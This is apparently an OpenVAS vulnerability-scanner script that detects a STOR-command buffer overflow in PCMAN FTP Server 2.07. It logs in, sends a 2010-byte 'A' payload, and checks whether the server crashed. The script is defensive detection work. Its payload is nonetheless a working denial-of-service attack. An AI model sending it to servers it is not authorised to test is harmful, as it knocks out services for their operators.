###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pcman_ftp_stor_buff_overflow_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# PCMAN FTP Server STOR Command Buffer Overflow vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803875");
  script_version("$Revision: 9353 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-08-21 16:49:10 +0530 (Wed, 21 Aug 2013)");
  script_name("PCMAN FTP Server STOR Command Buffer Overflow vulnerability");

  tag_summary =
"This host is running PCMAN FTP server and is prone to buffer overflow
vulnerability.";

  tag_vuldetect =
"Send a crafted huge request in STOR command and check whether the application
is crashed or not.";

  tag_insight =
"Flaw is due to an improper sanitation of user supplied input passed via the
'STOR' command followed by '/../' parameter.";

  tag_impact =
"Successful exploitation will allow a remote attacker to cause denial of
service condition result in loss of availability for the application.

Impact Level: Application";

  tag_affected =
"PCMAN FTP version 2.07, Other versions may also be affected.";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://1337day.com/exploit/21134");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27703");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080160");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122883");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

## Variable Initialization
ftplogin = "";
ftpPort = "";
banner = "";
user = "";
pass = "";
soc = "";

## Get the ftp port from KB
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check Port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:ftpPort);
if("220 PCMan's FTP Server" >!< banner){
  exit(0);
}

## Get Username from KB, If not given use default Username
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

## Get Password from KB, If not given use default Password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

## Open the socket
soc = open_sock_tcp(ftpPort);
if(!soc) exit(0);

## Login to the ftp server
ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  exit(0);
}

## Construct the crafted request
PAYLOAD = crap(data: "\x41", length:2010);

## Send specially crafted RETR command
send(socket:soc, data:string("STOR ", PAYLOAD, '\r\n'));

## Close FTP Socket
ftp_close(socket:soc);

sleep(3);

## Confirm the Exploit by opening socket
soc = open_sock_tcp(ftpPort);
if(!soc)
{
  security_message(ftpPort);
  exit(0);
}

## Confirm the Exploit by login
ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  ftp_close(socket:soc);
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc);
